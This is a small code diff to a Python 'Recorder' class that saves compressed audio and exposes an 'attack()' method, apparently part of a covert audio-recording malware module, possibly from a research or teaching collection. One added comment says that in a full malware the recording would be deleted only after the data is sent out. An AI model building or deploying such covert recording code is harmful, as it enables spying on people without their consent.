@@ -71,7 +71,7 @@ class Recorder:
         with open(self.ADPCM_OUTPUT_FILENAME, 'wb') as f:
             f.write(b''.join(compressed))
 
-    # Check whether the file exists and if it's in the correct size
+    # Check if the file exists and whether it's in the correct size
     def assert_postconditions(self):
         try:
             bytes_per_second = self.RATE * self.sample_size * self.CHANNELS / 8  # divided by 8 for compression
@@ -80,8 +80,8 @@ class Recorder:
             return False
 
     def cleanup(self):
-        pass  # nothing to do here really...
+        pass  # In context of a full malware, the output file will be deleted only after sending the data out
 
 
-recorder = Recorder(17)
+recorder = Recorder()
 print(recorder.attack())
